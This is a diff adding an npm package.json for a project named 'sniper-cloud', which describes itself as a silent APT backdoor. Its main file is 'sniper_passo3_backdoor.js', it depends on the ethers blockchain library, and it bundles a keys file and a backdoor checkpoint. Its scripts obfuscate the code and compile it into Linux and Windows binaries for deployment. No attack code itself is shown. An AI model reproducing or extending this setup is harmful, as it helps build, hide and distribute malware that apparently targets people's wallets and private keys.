@@ -1,0 +1,47 @@
+{
+  "name": "sniper-cloud",
+  "version": "1.0.0",
+  "description": "Sniper APT - Backdoor Silencioso",
+  "main": "sniper_passo3_backdoor.js",
+  "scripts": {
+    "build": "webpack --config webpack.config.js",
+    "obfuscate": "node ofuscar.js",
+    "binary": "pkg . --targets node18-linux-x64 --output ./bin/sniper",
+    "binary-win": "pkg . --targets node18-win-x64 --output ./bin/sniper.exe",
+    "deploy": "npm run build && npm run obfuscate && npm run binary",
+    "start": "node sniper_passo3_backdoor.js",
+    "start-obfuscated": "node dist/sniper_obfuscated.js",
+    "start-binary": "./bin/sniper",
+    "clean": "rm -rf dist bin node_modules",
+    "prepare": "npm run build"
+  },
+  "keywords": [
+    "sniper",
+    "blockchain",
+    "bsc",
+    "ethers",
+    "eip7702"
+  ],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "ethers": "^5.7.2"
+  },
+  "devDependencies": {
+    "terser-webpack-plugin": "^5.4.0",
+    "webpack": "^5.105.4",
+    "webpack-cli": "^7.0.2"
+  },
+  "bin": "./dist/sniper_obfuscated.js",
+  "pkg": {
+    "targets": [
+      "node18-linux-x64",
+      "node18-win-x64"
+    ],
+    "outputPath": "./bin",
+    "assets": [
+      "./chaves_952.txt",
+      "./checkpoint_backdoor.json"
+    ]
+  }
+}
